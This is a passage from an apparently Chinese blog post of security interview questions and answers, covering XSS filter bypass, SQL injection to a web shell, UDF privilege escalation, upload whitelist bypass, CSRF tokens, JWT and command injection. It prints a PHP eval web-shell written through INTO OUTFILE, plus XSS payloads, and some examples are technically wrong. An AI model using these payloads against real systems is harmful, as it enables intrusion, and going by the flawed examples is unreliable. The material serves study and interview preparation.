href="#%E5%B7%B2%E7%9F%A5%E6%9F%90%E4%B8%AA-a-py-%E8%BF%9B%E7%A8%8B%E8%B7%91%E7%9D%80%EF%BC%8C%E6%9F%A5%E7%9C%8B%E5%85%B6%E7%AB%AF%E5%8F%A3"><span class="toc-number">56.</span> <span class="toc-text">已知某个 a.py 进程跑着，查看其端口</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%9D%80%E6%AD%BB%E6%9C%BA%E5%99%A8%E6%89%80%E6%9C%89-python-%E8%BF%9B%E7%A8%8B%E3%80%81"><span class="toc-number">57.</span> <span class="toc-text">杀死机器所有 python 进程、</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#MongoDB-%E5%92%8C-MySQL"><span class="toc-number">58.</span> <span class="toc-text">MongoDB 和 MySQL</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#INNER-JOIN-LEFT-JOIN-RIGHT-JOIN"><span class="toc-number">59.</span> <span class="toc-text">INNER JOIN, LEFT JOIN, RIGHT JOIN</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%AD%90%E6%9F%A5%E8%AF%A2"><span class="toc-number">60.</span> <span class="toc-text">子查询</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#IP-%E5%9C%B0%E5%9D%80%E5%87%BA%E7%8E%B0%E6%AC%A1%E6%95%B0%E7%9A%84%E7%BB%9F%E8%AE%A1"><span class="toc-number">61.</span> <span class="toc-text">IP 地址出现次数的统计</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%B7%A5%E5%8E%82%E6%A8%A1%E5%BC%8F"><span class="toc-number">62.</span> <span class="toc-text">工厂模式</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Java-%E5%A6%82%E4%BD%95%E4%BF%9D%E8%AF%81%E7%BA%BF%E7%A8%8B%E5%AE%89%E5%85%A8"><span class="toc-number">63.</span> <span class="toc-text">Java 如何保证线程安全</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#CPU-%E5%8D%A0%E7%94%A8%E8%BF%87%E9%AB%98%E4%BD%86%E7%BB%93%E6%9E%9C%E8%BF%94%E5%9B%9E%E5%BE%88%E6%85%A2%E7%9A%84%E5%8E%9F%E5%9B%A0%E5%8F%8A%E8%A7%A3%E5%86%B3"><span class="toc-number">64.</span> <span class="toc-text">CPU 占用过高但结果返回很慢的原因及解决</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%86%85%E5%AD%98%E5%8D%A0%E7%94%A8%E8%BF%87%E9%AB%98%E7%9A%84%E5%8E%9F%E5%9B%A0%E5%8F%8A%E8%A7%A3%E5%86%B3"><span class="toc-number">65.</span> <span class="toc-text">内存占用过高的原因及解决</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%BA%BF%E7%A8%8B%E6%B1%A0%E7%BA%BF%E7%A8%8B%E6%95%B0%E9%87%8F%E7%9A%84%E8%AE%BE%E7%BD%AE"><span class="toc-number">66.</span> <span class="toc-text">线程池线程数量的设置</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BA%91AK-SK%E7%9B%B8%E5%85%B3%E7%9A%84%E5%88%A9%E7%94%A8%E5%92%8C%E9%98%B2%E5%BE%A1"><span class="toc-number">67.</span> <span class="toc-text">云AK&#x2F;SK相关的利用和防御</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%9C%A8%E5%8F%AA%E6%9C%89%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E7%9A%84%E6%83%85%E5%86%B5%E4%B8%8B%E6%9C%89%E4%BB%80%E4%B9%88%E5%88%A9%E7%94%A8%E6%96%B9%E5%BC%8F"><span class="toc-number">68.</span> <span class="toc-text">在只有任意文件读取的情况下有什么利用方式</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%80%8E%E4%B9%88%E6%89%BE%E5%BC%80%E4%BA%86%E4%BB%80%E4%B9%88%E6%9C%8D%E5%8A%A1%EF%BC%88-proc-pid-cmdline%EF%BC%89"><span class="toc-number">69.</span> <span class="toc-text">怎么找开了什么服务（&#x2F;proc&#x2F;pid&#x2F;cmdline）</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%80%8E%E4%B9%88%E6%89%BE%E9%85%8D%E7%BD%AE%E6%96%87%E4%BB%B6"><span class="toc-number">70.</span> <span class="toc-text">怎么找配置文件</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Linux%E5%BC%80%E6%9C%BA%E8%87%AA%E5%90%AF%E5%8A%A8%E6%96%87%E4%BB%B6-etc-rc-d-rc-local%E3%80%81-etc-init-d"><span class="toc-number">71.</span> <span class="toc-text">Linux开机自启动文件&#x2F;etc&#x2F;rc.d&#x2F;rc.local、&#x2F;etc&#x2F;init.d</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#SSO%E7%9B%B8%E5%85%B3%E7%9A%84%E6%94%BB%E5%87%BB%E6%96%B9%E5%BC%8F"><span class="toc-number">72.</span> <span class="toc-text">SSO相关的攻击方式</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%80%8E%E4%B9%88%E7%BB%95%E8%BF%87%E5%8A%A8%E6%80%81token"><span class="toc-number">73.</span> <span class="toc-text">怎么绕过动态token</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%80%8E%E4%B9%88%E7%BB%95%E8%BF%87%E5%8F%8C%E5%9B%A0%E5%AD%90%E8%AE%A4%E8%AF%81"><span class="toc-number">74.</span> <span class="toc-text">怎么绕过双因子认证</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%9F%9F%E7%8E%AF%E5%A2%83%E6%80%8E%E4%B9%88%E6%89%93"><span class="toc-number">75.</span> <span class="toc-text">域环境怎么打</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#IIS%E6%96%87%E4%BB%B6%E8%A7%A3%E6%9E%90%E6%BC%8F%E6%B4%9E"><span class="toc-number">76.</span> <span class="toc-text">IIS文件解析漏洞</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Redis%E6%94%BB%E5%87%BB%E6%96%B9%E5%BC%8F"><span class="toc-number">77.</span> <span class="toc-text">Redis攻击方式</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Redis%E4%B8%BB%E4%BB%8E%E5%A4%8D%E5%88%B6%E6%9D%A1%E4%BB%B6"><span class="toc-number">78.</span> <span class="toc-text">Redis主从复制条件</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#JWT%E6%94%BB%E5%87%BB%E6%96%B9%E5%BC%8F"><span class="toc-number">79.</span> <span class="toc-text">JWT攻击方式</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%A0%88%E6%BA%A2%E5%87%BA%E5%8E%9F%E7%90%86"><span class="toc-number">80.</span> <span class="toc-text">栈溢出原理</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%A0%88%E6%BA%A2%E5%87%BA%E4%BF%9D%E6%8A%A4%E6%9C%BA%E5%88%B6"><span class="toc-number">81.</span> <span class="toc-text">栈溢出保护机制</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#UDF-%E6%8F%90%E6%9D%83"><span class="toc-number">82.</span> <span class="toc-text">UDF 提权</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%9C%8D%E5%8A%A1%E5%99%A8%E5%90%AF%E5%8A%A8%E9%A1%B9%E6%8F%90%E6%9D%83%E6%80%8E%E4%B9%88%E5%81%9A%EF%BC%8C%E6%9C%89%E4%BB%80%E4%B9%88%E6%96%B9%E6%B3%95"><span class="toc-number">83.</span> <span class="toc-text">服务器启动项提权怎么做，有什么方法</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#MOF-%E6%8F%90%E6%9D%83%E6%98%AF%E6%80%8E%E4%B9%88%E5%AE%9E%E7%8E%B0%E7%9A%84"><span class="toc-number">84.</span> <span class="toc-text">MOF 提权是怎么实现的</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Linux-%E6%80%8E%E4%B9%88%E7%9C%8B%E6%97%A5%E5%BF%97%EF%BC%8C%E7%94%A8%E5%93%AA%E4%BA%9B%E5%91%BD%E4%BB%A4%EF%BC%9F"><span class="toc-number">85.</span> <span class="toc-text">Linux 怎么看日志，用哪些命令？</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Crontab-%E5%AE%9A%E6%97%B6%E4%BB%BB%E5%8A%A1%E7%9F%A5%E9%81%93%E5%90%97"><span class="toc-number">86.</span> <span class="toc-text">Crontab 定时任务知道吗</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#58%E4%B8%80%E4%B8%AA%E6%9C%8D%E5%8A%A1%E5%99%A8%E9%81%AD%E5%8F%97ARP%E6%AC%BA%E9%AA%97%EF%BC%8C%E6%80%8E%E4%B9%88%E6%8E%92%E6%9F%A5%EF%BC%9F"><span class="toc-number">87.</span> <span class="toc-text">58一个服务器遭受ARP欺骗，怎么排查？</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%80%8E%E4%B9%88%E6%9F%A5%E7%9C%8B%E7%AB%AF%E5%8F%A3%E5%8D%A0%E7%94%A8"><span class="toc-number">88.</span> <span class="toc-text">怎么查看端口占用</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%B8%80%E5%BC%A0%E6%95%B0%E6%8D%AE%E5%BA%93%E8%A1%A8%E6%9C%80%E5%A4%9A%E5%AD%98%E5%A4%9A%E5%B0%91%E6%9D%A1%E8%AE%B0%E5%BD%95"><span class="toc-number">89.</span> <span class="toc-text">一张数据库表最多存多少条记录</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%81%87%E5%88%B0%E5%AD%90%E5%9F%9F%E5%90%8D%E6%B3%9B%E8%A7%A3%E6%9E%90%E6%80%8E%E4%B9%88%E5%8A%9E"><span class="toc-number">90.</span> <span class="toc-text">遇到子域名泛解析怎么办</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E6%A8%AA%E5%90%91%E6%89%8B%E6%AE%B5%EF%BC%8C135%E3%80%81445%E7%AB%AF%E5%8F%A3"><span class="toc-number">91.</span> <span class="toc-text">内网渗透横向手段，135、445端口</span></a></li></ol>
      </div>
    
  </span>
</div>

    
    <div class="content index py4 ">
        
        <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">
  <header>
    
    <h1 class="posttitle p-name" itemprop="name headline">
        【工作】面试题整理 网络收集问题
    </h1>



    <div class="meta">
      <span class="author p-author h-card" itemprop="author" itemscope itemtype="http://schema.org/Person">
        <span class="p-name" itemprop="name">g0dam</span>
      </span>
      
    <div class="postdate">
      
        <time datetime="2024-03-16T13:09:24.000Z" class="dt-published" itemprop="datePublished">2024-03-16</time>
        
      
    </div>


      

      

    </div>
  </header>
  

  <div class="content e-content" itemprop="articleBody">
    <p>以下是对这些问题的回答，尽量做到全面且准确。但请注意，安全领域的知识不断更新，实际面试中还需要根据具体情况进行灵活应对。</p>
<hr>
<h3 id="XSS（跨站脚本攻击）"><a href="#XSS（跨站脚本攻击）" class="headerlink" title="XSS（跨站脚本攻击）"></a>XSS（跨站脚本攻击）</h3><h4 id="XSS对引号实体的绕过（a标签）"><a href="#XSS对引号实体的绕过（a标签）" class="headerlink" title="XSS对引号实体的绕过（a标签）"></a>XSS对引号实体的绕过（a标签）</h4><p>攻击者可以通过一些技巧绕过对引号的过滤。例如，如果过滤了双引号<code>&quot;</code>，可以使用单引号<code>&#39;</code>或HTML实体<code>&amp;#x27;</code>来替代。对于<code>a</code>标签，攻击者可以构造类似以下的恶意代码：</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&#x27;javascript:alert(1)&#x27;</span>&gt;</span>Click Me<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>如果过滤了<code>javascript:</code>，可以使用其他事件处理程序，如<code>onerror</code>：</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;http://example.com&quot;</span> <span class="attr">onerror</span>=<span class="string">&quot;alert(1)&quot;</span>&gt;</span>Click Me<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br></pre></td></tr></table></figure>
<h4 id="富文本编辑器解决XSS漏洞问题"><a href="#富文本编辑器解决XSS漏洞问题" class="headerlink" title="富文本编辑器解决XSS漏洞问题"></a>富文本编辑器解决XSS漏洞问题</h4><p>富文本编辑器通常会采用以下方法来防止XSS攻击：</p>
<ul>
<li><strong>内容净化</strong>：在将用户输入的内容渲染到页面之前，对内容进行净化，移除或转义可能的恶意脚本。</li>
<li><strong>白名单策略</strong>：只允许特定的HTML标签和属性，其他标签和属性都会被过滤掉。</li>
<li><strong>使用安全的渲染方式</strong>：例如，使用<code>textContent</code>而不是<code>innerHTML</code>来插入内容，避免HTML代码被解析执行。</li>
<li><strong>内容安全策略（CSP）</strong>：通过设置CSP头，限制富文本内容中可以加载的资源来源和执行的脚本。</li>
</ul>
<h4 id="富文本渲染的预防"><a href="#富文本渲染的预防" class="headerlink" title="富文本渲染的预防"></a>富文本渲染的预防</h4><p>富文本编辑器在渲染内容时，会通过以下方式预防XSS攻击：</p>
<ul>
<li><strong>转义HTML标签</strong>：将用户输入的HTML标签转义为文本形式，例如将<code>&lt;script&gt;</code>转义为<code>&amp;lt;script&amp;gt;</code>。</li>
<li><strong>限制脚本执行</strong>：通过CSP头或其他安全机制，限制富文本内容中脚本的执行。</li>
<li><strong>沙箱环境</strong>：将富文本内容渲染在一个沙箱环境中，限制其对页面其他部分的访问和操作。</li>
</ul>
<h3 id="2-SQL注入"><a href="#2-SQL注入" class="headerlink" title="2. SQL注入"></a>2. SQL注入</h3><h4 id="拿WebShell的方法"><a href="#拿WebShell的方法" class="headerlink" title="拿WebShell的方法"></a>拿WebShell的方法</h4><ul>
<li><strong>通过SQL注入写入文件</strong>：利用某些数据库的写文件功能，如MySQL的<code>INTO OUTFILE</code>，将WebShell代码写入到服务器的Web目录中。<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="string">&#x27;&lt;?php @eval($_POST[&quot;cmd&quot;]);?&gt;&#x27;</span> <span class="keyword">INTO</span> OUTFILE <span class="string">&#x27;/var/www/html/shell.php&#x27;</span>;</span><br></pre></td></tr></table></figure></li>
<li><strong>通过SQL注入修改数据库内容</strong>：如果数据库中存储了Web页面的HTML内容，可以通过SQL注入修改这些内容，嵌入WebShell代码。</li>
<li><strong>通过SQL注入执行系统命令</strong>：在某些情况下，可以通过SQL注入执行系统命令，如MySQL的<code>sys_exec</code>函数（需要UDF支持）。</li>
</ul>
<h4 id="能写入的函数"><a href="#能写入的函数" class="headerlink" title="能写入的函数"></a>能写入的函数</h4><ul>
<li><strong>MySQL</strong>：<ul>
<li><code>INTO OUTFILE</code>：将查询结果写入到文件中。</li>
<li><code>LOAD_FILE</code>：读取文件内容，但不能直接写入。</li>
<li><code>sys_exec</code>（需要UDF支持）：执行系统命令。</li>
</ul>
</li>
<li><strong>MSSQL</strong>：<ul>
<li><code>xp_cmdshell</code>：执行系统命令。</li>
<li><code>sp_oacreate</code>：通过OLE自动化过程执行系统命令。</li>
</ul>
</li>
<li><strong>Oracle</strong>：<ul>
<li><code>UTL_FILE</code>：用于文件操作。</li>
<li><code>DBMS_SCHEDULER</code>：可以执行系统命令。</li>
</ul>
</li>
</ul>
<h4 id="UDF提权的底层原理"><a href="#UDF提权的底层原理" class="headerlink" title="UDF提权的底层原理"></a>UDF提权的底层原理</h4><p>UDF（User-Defined Function）提权是通过在数据库中创建自定义函数来实现的。以MySQL为例，攻击者首先需要将一个恶意的DLL文件（Windows）或SO文件（Linux）上传到服务器上，然后在MySQL中创建一个UDF函数，指向这个恶意的DLL或SO文件。当调用这个UDF函数时，恶意代码会被执行，从而实现提权或执行系统命令。</p>
<h4 id="预编译"><a href="#预编译" class="headerlink" title="预编译"></a>预编译</h4><p>预编译是一种防止SQL注入的技术，通过将SQL语句和参数分开处理，避免了SQL语句被恶意拼接。预编译的底层原理是将SQL语句发送给数据库服务器进行解析和优化，然后将参数单独发送，由数据库服务器进行安全的参数替换。</p>
<h4 id="不能预编译的情况"><a href="#不能预编译的情况" class="headerlink" title="不能预编译的情况"></a>不能预编译的情况</h4><ul>
<li><strong>动态表名或列名</strong>：如果SQL语句中的表名或列名是动态生成的，无法使用预编译，因为预编译要求SQL语句的结构是固定的。<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$table</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;table&#x27;</span>];</span><br><span class="line"><span class="variable">$stmt</span> = <span class="variable">$pdo</span>-&gt;<span class="title function_ invoke__">prepare</span>(<span class="string">&quot;SELECT * FROM <span class="subst">$table</span>&quot;</span>);</span><br></pre></td></tr></table></figure></li>
<li><strong>复杂的动态SQL</strong>：某些复杂的SQL语句，如动态生成的<code>WHERE</code>子句，可能无法直接使用预编译。<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$where</span> = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;name&#x27;</span>])) &#123;</span><br><span class="line">    <span class="variable">$where</span> .= <span class="string">&quot; AND name = &#x27;<span class="subst">$_GET</span>[name]&#x27;&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;age&#x27;</span>])) &#123;</span><br><span class="line">    <span class="variable">$where</span> .= <span class="string">&quot; AND age = <span class="subst">$_GET</span>[age]&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$stmt</span> = <span class="variable">$pdo</span>-&gt;<span class="title function_ invoke__">prepare</span>(<span class="string">&quot;SELECT * FROM users WHERE 1=1 <span class="subst">$where</span>&quot;</span>);</span><br></pre></td></tr></table></figure></li>
</ul>
<h4 id="ORDER-BY不能预编译的原因"><a href="#ORDER-BY不能预编译的原因" class="headerlink" title="ORDER BY不能预编译的原因"></a><code>ORDER BY</code>不能预编译的原因</h4><p><code>ORDER BY</code>子句中的字段名通常是动态的，无法直接使用预编译。例如：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$order</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;order&#x27;</span>];</span><br><span class="line"><span class="variable">$stmt</span> = <span class="variable">$pdo</span>-&gt;<span class="title function_ invoke__">prepare</span>(<span class="string">&quot;SELECT * FROM users ORDER BY <span class="subst">$order</span>&quot;</span>);</span><br></pre></td></tr></table></figure>
<p>在这种情况下，<code>$order</code>是动态的，无法作为预编译的一部分。如果直接拼接，可能会导致SQL注入。<br><a target="_blank" rel="noopener" href="https://www.cnblogs.com/lsdb/p/12084038.html">这篇博客讲的很不错</a></p>
<h4 id="ORDER-BY语法树报错的原因"><a href="#ORDER-BY语法树报错的原因" class="headerlink" title="ORDER BY语法树报错的原因"></a><code>ORDER BY</code>语法树报错的原因</h4><p><code>ORDER BY</code>子句中的字段名是SQL语句的一部分，如果字段名被恶意篡改，可能会导致语法树解析错误。例如：</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">FROM</span> users <span class="keyword">ORDER</span> <span class="keyword">BY</span> <span class="number">1</span> <span class="keyword">DESC</span>, <span class="number">2</span> <span class="keyword">DESC</span>;</span><br></pre></td></tr></table></figure>
<p>如果攻击者将<code>ORDER BY</code>子句篡改为：</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">FROM</span> users <span class="keyword">ORDER</span> <span class="keyword">BY</span> <span class="number">1</span> <span class="keyword">DESC</span>, <span class="number">2</span> <span class="keyword">DESC</span>, <span class="number">3</span> <span class="keyword">DESC</span>, <span class="number">4</span> <span class="keyword">DESC</span>;</span><br></pre></td></tr></table></figure>
<p>这可能会导致语法树解析错误，因为字段名<code>3</code>和<code>4</code>在表中不存在。</p>
<h3 id="3-文件上传"><a href="#3-文件上传" class="headerlink" title="3. 文件上传"></a>3. 文件上传</h3><h4 id="除了拿WebShell还能做什么"><a href="#除了拿WebShell还能做什么" class="headerlink" title="除了拿WebShell还能做什么"></a>除了拿WebShell还能做什么</h4><ul>
<li><strong>信息收集</strong>：上传一个脚本，用于收集服务器的配置信息、环境信息等。</li>
<li><strong>横向移动</strong>：上传一个脚本，用于扫描内网其他服务器的漏洞。</li>
<li><strong>数据泄露</strong>：上传一个脚本，用于窃取服务器上的敏感数据。</li>
<li><strong>DDoS攻击</strong>：上传一个脚本，用于发起分布式拒绝服务攻击。</li>
</ul>
<h4 id="传HTML后还能做什么"><a href="#传HTML后还能做什么" class="headerlink" title="传HTML后还能做什么"></a>传HTML后还能做什么</h4><ul>
<li><strong>钓鱼攻击</strong>：上传一个HTML页面，用于模拟登录页面，窃取用户的用户名和密码。</li>
<li><strong>XSS攻击</strong>：上传一个HTML页面，用于嵌入恶意脚本，攻击访问该页面的用户。</li>
<li><strong>CSRF攻击</strong>：上传一个HTML页面，用于构造恶意的CSRF请求，攻击其他用户。</li>
</ul>
<h4 id="Apache-PHP-JPG白名单绕过"><a href="#Apache-PHP-JPG白名单绕过" class="headerlink" title="Apache PHP JPG白名单绕过"></a>Apache PHP JPG白名单绕过</h4><ul>
<li><strong>MIME类型绕过</strong>：通过修改文件的MIME类型，使其看起来像一个合法的图片文件，但实际上是一个PHP文件。</li>
<li><strong>文件名绕过</strong>：通过构造特殊的文件名，如<code>test.jpg.php</code>，绕过文件名的检查。</li>
<li><strong>文件内容绕过</strong>：在图片文件的末尾添加PHP代码，然后通过某些漏洞（如PHP的<code>include</code>函数）执行该代码。</li>
</ul>
<h4 id="IIS白名单绕过"><a href="#IIS白名单绕过" class="headerlink" title="IIS白名单绕过"></a>IIS白名单绕过</h4><ul>
<li><strong>文件扩展名绕过</strong>：IIS可能对某些扩展名进行限制，但攻击者可以通过扩展名混淆（如<code>.asp;.jpg</code>）或利用IIS的解析漏洞（如IIS 6.0的<code>~</code>漏洞）绕过限制。</li>
<li><strong>文件头绕过</strong>：通过修改文件头，使其看起来像合法的图片文件（如添加<code>GIF89a</code>头），同时嵌入恶意代码。</li>
<li><strong>双扩展名绕过</strong>：上传文件时，使用双扩展名（如<code>test.jpg.asp</code>），某些配置错误的IIS服务器可能会解析为ASP文件。</li>
<li><strong>利用中间件漏洞</strong>：如果IIS与其他中间件（如PHP、ASP.NET）结合使用，可能通过中间件的漏洞绕过文件上传限制。</li>
</ul>
<h3 id="4-CSRF（跨站请求伪造）"><a href="#4-CSRF（跨站请求伪造）" class="headerlink" title="4. CSRF（跨站请求伪造）"></a>4. CSRF（跨站请求伪造）</h3><h4 id="Token的实现"><a href="#Token的实现" class="headerlink" title="Token的实现"></a>Token的实现</h4><p>CSRF攻击是攻击者通过伪造用户的请求，利用用户的认证信息（如Cookie）在目标网站上执行恶意操作。使用Token可以有效防止CSRF攻击，具体实现如下：</p>
<ul>
<li><strong>生成Token</strong>：在用户登录后，服务器生成一个随机的Token，并将其存储在用户的会话中（如Session）。</li>
<li><strong>发送Token</strong>：在每个需要验证的表单或请求中，将Token作为隐藏字段或请求参数发送给服务器。</li>
<li><strong>验证Token</strong>：服务器在处理请求时，会检查请求中的Token是否与会话中的Token一致。如果不一致，则拒绝请求。</li>
</ul>
<p>例如，在HTML表单中：</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">&quot;/submit&quot;</span> <span class="attr">method</span>=<span class="string">&quot;POST&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;hidden&quot;</span> <span class="attr">name</span>=<span class="string">&quot;csrf_token&quot;</span> <span class="attr">value</span>=<span class="string">&quot;&#123;&#123; session.csrf_token &#125;&#125;&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">name</span>=<span class="string">&quot;data&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">button</span> <span class="attr">type</span>=<span class="string">&quot;submit&quot;</span>&gt;</span>Submit<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br></pre></td></tr></table></figure>

<h4 id="关于JWT"><a href="#关于JWT" class="headerlink" title="关于JWT"></a>关于JWT</h4><p>JWT（JSON Web Token）是一种开放标准（RFC 7519），用于在客户端和服务器之间安全地传递信息。JWT本身不是用来防止CSRF的，而是用于身份验证和授权。JWT的安全性依赖于签名验证，但如果不正确使用（如未设置HttpOnly属性或未验证Token来源），可能会被攻击者利用。<br>JSON Web Token（JWT）是一种开放标准（RFC 7519），它定义了一种紧凑且自包含的方式，用于在各方之间作为JSON对象安全地传输信息。每个JWT都是经过数字签名的，因此您可以验证发送者的身份并确保数据在传输过程中未被篡改。</p>
<ol>
<li><strong>JWT结构</strong>：JWT由三部分组成：Header（头部）、Payload（负载）和Signature（签名）。这三个部分串联成一个字符串，用点（.）分隔。</li>
<li><strong>Header</strong>：Header通常包含两部分信息：token的类型（即JWT）和所使用的签名算法（如HMAC SHA256或RSA）。例如：<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">  <span class="attr">&quot;alg&quot;</span><span class="punctuation">:</span> <span class="string">&quot;HS256&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;typ&quot;</span><span class="punctuation">:</span> <span class="string">&quot;JWT&quot;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>
这个头部信息会被转换成Base64Url编码的字符串。</li>
<li><strong>Payload</strong>：Payload包含所谓的Claims（声明），它们是关于实体（通常是用户）和其他数据的陈述。Claims可以分为三类：标准声明、公共声明和私有声明。例如：<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">  <span class="attr">&quot;sub&quot;</span><span class="punctuation">:</span> <span class="string">&quot;1234567890&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;name&quot;</span><span class="punctuation">:</span> <span class="string">&quot;John Doe&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;iat&quot;</span><span class="punctuation">:</span> <span class="number">1516239022</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>
标准声明包括例如iss（发行人）、exp（过期时间）、iat（发行时间）等字段。Payload同样会被转换成Base64Url编码的字符串。</li>
<li><strong>Signature</strong>：Signature用于验证消息在传输过程中未被篡改，并且，对于使用私钥签名的token，还可以验证发送者的身份。Signature是使用Header中指定的算法和密钥生成的。生成方式如下：<ul>
<li>对Header和Payload的Base64Url编码字符串进行连接</li>
<li>使用密钥对连接后的字符串进行签名</li>
<li>最终的Signature也是Base64Url编码的字符串。</li>
</ul>
</li>
<li><strong>JWT的生成和验证</strong>：在用户登录成功后，服务器会生成一个JWT，然后将其发送给客户端。客户端在随后的请求中将JWT发送回服务器，服务器通过验证JWT的签名来确认其有效性。</li>
<li><strong>安全性</strong>：JWT的安全性依赖于密钥的保密性。如果密钥泄露，攻击者可以生成自己的JWT或篡改现有的JWT。因此，密钥必须保密，且JWT不适合存储敏感信息。</li>
</ol>
<hr>
<h3 id="5-命令执行"><a href="#5-命令执行" class="headerlink" title="5. 命令执行"></a>5. 命令执行</h3><h4 id="命令执行的原因"><a href="#命令执行的原因" class="headerlink" title="命令执行的原因"></a>命令执行的原因</h4><p>命令执行漏洞通常是由于应用程序错误地将用户输入直接传递给系统命令或脚本解释器，导致攻击者可以注入恶意命令。常见的原因包括：</p>
<ul>
<li><strong>不安全的函数调用</strong>：如PHP中的<code>system()</code>、<code>exec()</code>、<code>shell_exec()</code>等函数，如果直接使用用户输入作为参数，可能会导致命令注入。</li>
<li><strong>错误的输入验证</strong>：未对用户输入进行严格过滤或转义，导致恶意命令被注入。</li>
